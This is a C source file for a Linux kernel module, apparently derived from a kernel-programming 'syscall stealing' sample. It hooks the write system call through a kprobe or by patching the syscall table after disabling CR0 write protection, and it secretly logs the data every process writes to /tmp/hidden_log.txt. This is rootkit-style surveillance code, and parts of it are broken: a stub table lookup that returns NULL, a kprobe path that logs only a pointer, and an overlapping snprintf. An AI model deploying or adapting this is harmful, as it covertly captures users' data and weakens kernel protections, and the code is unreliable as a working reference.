/* 
 * syscall-steal.c 
 * 
 * System call "stealing" sample. 
 * 
 * Disables page protection at a processor level by changing the 16th bit 
 * in the cr0 register (could be Intel specific). 
 */ 
 
 #include <linux/delay.h> 
 #include <linux/kernel.h> 
 #include <linux/module.h> 
 #include <linux/moduleparam.h> /* which will have params */ 
 #include <linux/unistd.h> /* The list of system calls */ 
 #include <linux/cred.h> /* For current_uid() */ 
 #include <linux/uidgid.h> /* For __kuid_val() */ 
 #include <linux/version.h> 
 #include <linux/fs.h>
 #include <linux/uaccess.h>
 #include <linux/fcntl.h>
 
 /* For the current (process) structure, we need this to know who the 
  * current user is. 
  */ 
 #include <linux/sched.h> 
 #include <linux/uaccess.h> 
  
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)) 
  
 #if LINUX_VERSION_CODE <= KERNEL_VERSION(5, 4, 0) 
 #define HAVE_KSYS_CLOSE 1 
 #include <linux/syscalls.h> /* For ksys_close() */ 
 #else 
 #include <linux/kallsyms.h> /* For kallsyms_lookup_name */ 
 #endif 
  
 #else 
  
 #if defined(CONFIG_KPROBES) 
 #define HAVE_KPROBES 1 
 #if defined(CONFIG_X86_64) 
 #define USE_KPROBES_PRE_HANDLER_BEFORE_SYSCALL 1 
 #endif 
 #include <linux/kprobes.h> 
 #else 
 #define HAVE_PARAM 1 
 #include <linux/kallsyms.h> /* For sprint_symbol */ 
 static unsigned long sym = 0; 
 module_param(sym, ulong, 0644); 
 #endif /* CONFIG_KPROBES */ 
  
 #endif /* Version < v5.7 */ 
  
 #if USE_KPROBES_PRE_HANDLER_BEFORE_SYSCALL 
  
 static char *syscall_sym = "__x64_sys_write"; 
 module_param(syscall_sym, charp, 0644); 
  
 static int sys_call_kprobe_pre_handler(struct kprobe *p, struct pt_regs *regs) 
 { 
     struct file *file;
     char buf[256] = {0};
 
     snprintf(buf, sizeof(buf), "Process %d wrote: %lx\n", current->pid, regs->si);
 
     file = filp_open("/tmp/hidden_log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (IS_ERR(file)) 
         return 0;
     
     // Modern kernel (5.10+) uses kernel_write instead of set_fs/get_fs/vfs_write
     kernel_write(file, buf, strlen(buf), &file->f_pos);
     filp_close(file, NULL);
 
     return 0; 
 } 
  
 static struct kprobe syscall_kprobe = { 
     .symbol_name = "__x64_sys_write", 
     .pre_handler = sys_call_kprobe_pre_handler, 
 }; 
  
 #else 
  
 static unsigned long **sys_call_table_stolen; 
  
 #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER 
 static asmlinkage long (*original_call)(const struct pt_regs *); 
 #else 
 static asmlinkage long (*original_call)(unsigned int, const char __user *, size_t); 
 #endif 
  
 #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER 
 static asmlinkage long our_sys_write(const struct pt_regs *regs) 
 #else 
 static asmlinkage long our_sys_write(unsigned int fd, const char __user *buf, size_t count) 
 #endif 
 { 
     struct file *file;
     char kbuf[256] = {0};
 
 #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER
     unsigned int fd = regs->di;
     const char __user *buf = (const char __user *)regs->si;
     size_t count = regs->dx;
 #endif
 
     // Try to copy user data - be careful with count to avoid overflows
     if (count > 0) {
         size_t bytes_to_copy = min(count, (size_t)sizeof(kbuf) - 1);
         unsigned long not_copied;
         
         not_copied = copy_from_user(kbuf, buf, bytes_to_copy);
         if (not_copied < bytes_to_copy) {
             kbuf[bytes_to_copy - not_copied] = '\0';
         }
     }
 
     snprintf(kbuf, sizeof(kbuf), "Process %d wrote: %.100s\n", current->pid, kbuf);
 
     file = filp_open("/tmp/hidden_log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (!IS_ERR(file)) {
         kernel_write(file, kbuf, strlen(kbuf), &file->f_pos);
         filp_close(file, NULL);
     }
 
 #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER 
     return original_call(regs); 
 #else 
     return original_call(fd, buf, count); 
 #endif 
 } 
  
 #endif 
  
 /* Functions to disable/enable write protection */
 static inline void disable_write_protection(void)
 {
     unsigned long cr0 = read_cr0();
     clear_bit(16, &cr0);
     write_cr0(cr0);
 }
 
 static inline void enable_write_protection(void)
 {
     unsigned long cr0 = read_cr0();
     set_bit(16, &cr0);
     write_cr0(cr0);
 }
 
 /* Function to acquire syscall table - may need implementation */
 static unsigned long **acquire_sys_call_table(void)
 {
     /* Implementation needed here */
     pr_alert("Syscall table acquisition not implemented for this kernel\n");
     return NULL;
 }
 
 static int __init syscall_steal_start(void) 
 { 
     pr_info("Module loading with kernel %d.%d.%d\n", 
             (LINUX_VERSION_CODE >> 16), 
             ((LINUX_VERSION_CODE >> 8) & 0xFF),
             (LINUX_VERSION_CODE & 0xFF));
     
 #if USE_KPROBES_PRE_HANDLER_BEFORE_SYSCALL 
     int err; 
     syscall_kprobe.symbol_name = syscall_sym; 
     err = register_kprobe(&syscall_kprobe); 
     if (err) { 
         pr_err("register_kprobe() on %s failed: %d\n", syscall_sym, err); 
         return err; 
     }
     pr_info("Registered kprobe for %s\n", syscall_sym);
 #else 
     if (!(sys_call_table_stolen = acquire_sys_call_table())) {
         pr_err("Failed to acquire syscall table\n");
         return -1; 
     }
     pr_info("Acquired syscall table\n");
     
     disable_write_protection(); 
     original_call = (void *)sys_call_table_stolen[__NR_write]; 
     sys_call_table_stolen[__NR_write] = (unsigned long *)our_sys_write; 
     enable_write_protection(); 
 #endif 
     pr_info("Logging all write syscalls to /tmp/hidden_log.txt\n"); 
     return 0; 
 } 
  
 static void __exit syscall_steal_end(void) 
 { 
 #if USE_KPROBES_PRE_HANDLER_BEFORE_SYSCALL 
     unregister_kprobe(&syscall_kprobe);
     pr_info("Unregistered kprobe for %s\n", syscall_sym);
 #else 
     if (!sys_call_table_stolen) 
         return; 
     disable_write_protection(); 
     sys_call_table_stolen[__NR_write] = (unsigned long *)original_call; 
     enable_write_protection(); 
     pr_info("Stopped logging write syscalls\n");
 #endif 
     msleep(2000); 
 } 
  
 module_init(syscall_steal_start); 
 module_exit(syscall_steal_end); 
  
 MODULE_LICENSE("GPL");



